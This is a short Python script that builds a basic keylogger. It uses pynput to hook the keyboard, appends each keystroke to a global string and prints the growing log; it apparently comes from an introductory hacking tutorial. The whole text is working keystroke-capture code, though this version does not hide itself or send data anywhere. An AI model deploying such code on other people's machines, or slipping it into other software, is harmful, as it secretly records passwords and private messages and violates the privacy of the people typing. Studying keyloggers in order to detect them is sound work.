#!/usr/bin/env python

import pynput.keyboard  # allows us to monitor mouse and keyboard

log = ""

def process_key_press(key):
    global log
    log = log + str(key)
    print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()    # starting the listener
